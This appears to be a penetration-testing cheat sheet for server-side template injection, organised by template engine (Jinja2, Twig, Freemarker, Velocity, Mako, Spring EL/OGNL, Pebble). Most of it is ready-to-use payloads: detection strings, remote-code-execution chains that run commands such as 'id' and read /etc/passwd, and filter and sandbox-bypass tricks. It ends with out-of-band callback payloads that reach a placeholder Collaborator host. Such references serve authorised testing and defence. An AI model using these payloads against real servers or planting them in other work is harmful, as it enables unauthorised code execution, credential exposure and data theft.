# SSTI Payload Reference

Server-Side Template Injection detection, identification, and exploitation payloads. Organized by template engine.

---

## Detection Payloads

Inject these to determine if template injection exists. Look for evaluated output.

```
{{7*7}}              -> 49  (Jinja2, Twig, Nunjucks, Handlebars)
${7*7}               -> 49  (Freemarker, Mako, EL, Thymeleaf)
#{7*7}               -> 49  (Ruby ERB, Thymeleaf, Pebble)
<%= 7*7 %>           -> 49  (ERB, EJS)
{7*7}                -> 49  (Velocity, Smarty)
{{7*'7'}}            -> 7777777 (Jinja2) vs 49 (Twig) -- differentiator
${7*7}               -> 49  (Spring EL, Freemarker)
@(1+1)               -> 2   (Razor / .NET)
#set($x=7*7)${x}    -> 49  (Velocity)
```

Universal detection string (try all at once):

```
${{<%[%'"}}%\
```

If the application errors on this, template injection is likely present.

---

## Engine Identification Decision Tree

```
1. Inject: {{7*7}}
   -> 49?  Go to step 2
   -> Not 49? Try ${7*7}, go to step 4

2. Inject: {{7*'7'}}
   -> 7777777?  => Jinja2 (Python)
   -> 49?       => Twig (PHP) or Nunjucks (JS)

3. Twig vs Nunjucks:
   Inject: {{_self.env.display("test")}}
   -> Works? => Twig
   -> Error? => Nunjucks

4. ${7*7} = 49?
   -> Try: ${class.getClass()}
      -> Works? => Freemarker (Java)
   -> Try: ${T(java.lang.Runtime)}
      -> Works? => Spring EL (Java)
   -> Try: ${self.module.cache.util.os.system("id")}
      -> Works? => Mako (Python)

5. <%= 7*7 %> = 49?
   -> Check if Ruby (ERB) or JavaScript (EJS)
   -> Try: <%= system("id") %>
      -> Works? => ERB (Ruby)

6. #{7*7} = 49?
   -> Try: #{T(java.lang.Runtime).getRuntime().exec("id")}
      -> Works? => Thymeleaf or Pebble (Java)
```

---

## Jinja2 (Python)

### Detection / Fingerprinting

```
{{7*7}}             -> 49
{{7*'7'}}           -> 7777777
{{config}}          -> dumps Flask config
{{config.items()}}  -> config key/values
{{self}}            -> template object info
```

### Information Disclosure

```python
{{config}}
{{config.SECRET_KEY}}
{{request.environ}}
{{request.headers}}
```

### RCE Exploitation Chain

Classic MRO traversal:

```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

Find a useful class (e.g., subprocess.Popen, os._wrap_close) then call it:

```python
# Find index of os._wrap_close or subprocess.Popen in subclasses list
{{''.__class__.__mro__[1].__subclasses__()[INDEX].__init__.__globals__['os'].popen('id').read()}}
```

Direct RCE payloads (battle-tested):

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

{{cycler.__init__.__globals__.os.popen('id').read()}}

{{joiner.__init__.__globals__.os.popen('id').read()}}

{{namespace.__init__.__globals__.os.popen('id').read()}}

{{lipsum.__globals__['os'].popen('id').read()}}

{{lipsum.__globals__.os.popen('whoami').read()}}
```

If `_` is blocked:

```python
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

If `[]` and `.` are blocked (filter bypass):

```python
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Twig (PHP)

### Detection

```twig
{{7*7}}              -> 49
{{7*'7'}}            -> 49  (string multiplication not supported = numeric)
{{dump(app)}}        -> dumps application object
{{app.request.server.all|join(',')}} -> server variables
```

### RCE Payloads

Twig 1.x:

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
```

Twig 3.x (if `system` is available via allowed functions):

```twig
{{['id']|filter('system')}}
{{['whoami']|filter('exec')}}
{{['cat /etc/passwd']|filter('system')}}
```

---

## Freemarker (Java)

### Detection

```
${7*7}              -> 49
${"freemarker"}     -> freemarker
${.version}         -> Freemarker version
```

### RCE Payloads

```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}

${"freemarker.template.utility.Execute"?new()("id")}
```

Read files:

```java
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
```

---

## Velocity (Java)

### Detection

```velocity
#set($x=7*7)${x}    -> 49
$class.inspect("java.lang.Runtime")
```

### RCE Payloads

```velocity
#set($cmd='id')
#set($rt=$class.inspect("java.lang.Runtime").type)
#set($getrt=$rt.getMethod("getRuntime"))
#set($runtime=$getrt.invoke($null))
#set($exec=$rt.getMethod("exec","java.lang.String"))
#set($process=$exec.invoke($runtime,$cmd))
#set($reader=$class.inspect("java.io.InputStreamReader").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($process.getInputStream()))
#set($scanner=$class.inspect("java.util.Scanner").type.getConstructor($class.inspect("java.io.InputStream").type).newInstance($process.getInputStream()))
$scanner.useDelimiter("\A").next()
```

Shorter version (may work depending on context):

```velocity
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
```

---

## Mako (Python)

### Detection

```python
${7*7}               -> 49
```

### RCE Payloads

```python
${self.module.cache.util.os.system("id")}
${self.module.cache.util.os.popen("id").read()}

<%
import os
x=os.popen('id').read()
%>
${x}

<%import os;os.system("id")%>
```

---

## EL / OGNL (Java)

### Expression Language (Spring/JSP)

Detection:

```
${7*7}                -> 49
#{7*7}                -> 49
${T(java.lang.System).getenv()}
```

RCE:

```java
${T(java.lang.Runtime).getRuntime().exec('id')}
${T(java.lang.Runtime).getRuntime().exec("id")}

# Spring specific
#{T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}

# Read output
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

### OGNL (Struts2)

```java
%{(#rt=@java.lang.Runtime@getRuntime()).(#rt.exec("id"))}
${#rt=@java.lang.Runtime@getRuntime(),#rt.exec("id")}
```

---

## Pebble (Java)

### Detection

```
{{7*7}}    -> 49
```

### RCE

```java
{% set cmd = 'id' %}
{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}
{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes])bytes) }}
```

---

## Sandbox Escape Techniques

### Jinja2 Sandbox Escape

When `SandboxedEnvironment` is used, restricted classes are blocked. Try:

1. Enumerate subclasses to find one not blocked:

```python
{{''.__class__.__mro__[1].__subclasses__()}}
```

2. Look for `warnings.catch_warnings`, `subprocess.Popen`, or `os._wrap_close`
3. Use `|attr()` filter to bypass attribute restrictions
4. Use string concatenation to bypass keyword filters:

```python
{{request|attr('__cl'+'ass__')}}
```

### Generic Bypass Tips

- Use `|attr()` filter instead of dot notation
- Use hex/unicode escapes for blocked characters
- Use `request.args` or `request.cookies` to smuggle payloads
- Chain `__init__.__globals__` to access builtins from any object
- Use `config` object in Flask for information disclosure first

---

## Proof of Concept Tips

For reports, demonstrate impact clearly:

1. **Prove template injection**: `{{7*7}}` returning `49`
2. **Identify engine**: Show the decision tree result
3. **Read sensitive file**: `/etc/passwd` or config files
4. **Prove RCE**: `id` or `whoami` output (do NOT run destructive commands)

Out-of-band proof if output is not reflected:

```python
# Jinja2 - DNS callback
{{lipsum.__globals__.os.popen('nslookup BURP-COLLAB-ID.oastify.com').read()}}

# Freemarker - DNS callback
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup BURP-COLLAB-ID.oastify.com")}
```
